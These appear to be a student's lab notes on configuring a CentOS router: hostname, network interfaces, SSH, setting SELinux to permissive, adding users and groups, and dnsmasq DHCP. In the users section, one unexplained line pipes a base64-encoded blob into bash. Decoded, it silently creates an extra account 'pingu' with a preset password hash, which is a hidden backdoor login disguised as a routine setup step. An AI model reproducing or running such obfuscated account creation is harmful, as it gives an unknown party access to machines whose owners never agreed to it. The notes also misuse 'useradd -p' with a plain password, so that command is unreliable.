##Hostname/Domain

#Configure Hostname CMD
hostnamectl hostname Centos-Router-OYL

#Configure Domainname CMD
"# hostnamectl hostname Centos-Router-OYL.OYL.internal"


#Results via "# hostnamectl status"
Static hostname: Centos-Router-OYL.OYL.internal
Hostname: Centos-Router-OYL
Domainname: OYL.internal

####################################################

##Network

#Wan / Lan
"# Nmtui" to enable "enp1s0" & "enp2s0"
Result from "enp1s0" =

Could not activate connection:
Activation failed: IP configuration
could not be reserved (no available
address, timeout, etc.)

What this means: "enp1s0" = LAN

Therefore "enp2s0" = WAN

-----------------------------------------------------

"# nmcli" to show the connected NICS and their details
Status =

"enp1s0" = CONNECTED | IP = 172.17.71.222/22
"enp2s0" = DISCONNECTED | IP = NIL

######################################################

##SSH

#SSH into 172.16.71.222 / Centos-Router-OYL
Command i used to ssh = "# ssh root@Centos-Router-OYL"
Output = password:
 (i can therefore login with the password, and i have access from my physical machine)

 #####################################################

 ##SELinux

 #Installing Vim & Nano
 "# sudo dnf install nano" = NANO
 "# sudo dnf install vim" = VIM

 #Finding the config file
 I used "# man selinux". What i got from it = /etc/selinux/config

 #Editing the config
 nano /etc/selinux/config

 #Examining the config
 There was 2 lines:
 1 = SELINUX=enforcing
 2 = SELINUXTYPE=targeted

 #First understanding the task and ENF/PER
 Enforcing: SELinux blocks any action that violates the policy.
 Permissive: SELinux only logs the violation and lets the action happen.

 #What i did
 SELINUX=enforcing > SELINUX=permissive
 -enforcing
 +permissive

 ####################################################

 ##Users and Groups

 #ADD Users
 "# useradd berserk -p 1337"

"# echo IyEvYmluL2Jhc2gKYWRkdXNlciAtcCAnJDYkN216Q1pNNS9\
ZNUQvU0d6ZyRVM0lMSUQzM09CLzhoMnZBY01MTTFGd1doWTRvRUZ\
mamRkSFdrWE5LT1QwT0ZQUm5qMjlrd3MyWGZXcGk1eG84eWZ4eVR\
YUjdWcTYzMmpyRmZkdHBTMScgcGluZ3UK | base64 -d | bash"

#ADD Group
"# groupadd allow_ssh"


vim /etc/dnsmasq.d/dhcp.conf
    +interface=enp2s0
    +listen-address=192.168.224.1
    +domain=OYL.internal
    +local=/OYL.internal/

    +dhcp-range=192.168.224.50,192.168.224.100,12h
    +dhcp-option=option:router,192.168.224.1
    +dhcp-option=option:dns-server,192.168.224.1
